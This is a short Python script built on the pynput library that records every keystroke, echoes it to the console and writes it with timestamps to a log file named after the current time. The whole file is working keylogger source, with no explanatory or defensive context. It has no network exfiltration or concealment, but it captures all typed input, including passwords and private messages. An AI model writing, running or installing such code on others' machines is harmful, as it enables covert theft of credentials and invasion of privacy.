from pynput.keyboard import Key, Listener
import logging
from datetime import datetime 


def listen():
    def dString():
        xtime = datetime.utcnow()

        time_string = f"keylog[{xtime.month}.{xtime.day}.{xtime.year}..{xtime.hour}:{xtime.minute}.{xtime.second}{xtime.microsecond}]"

        return time_string


    logging.basicConfig(filename=(f"logs/{dString()}"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")



    def on_press(key):
        print(str(key))
        keystring = f"{key}"

        logging.info(keystring)
 
    with Listener(on_press=on_press) as listener:
        listener.join()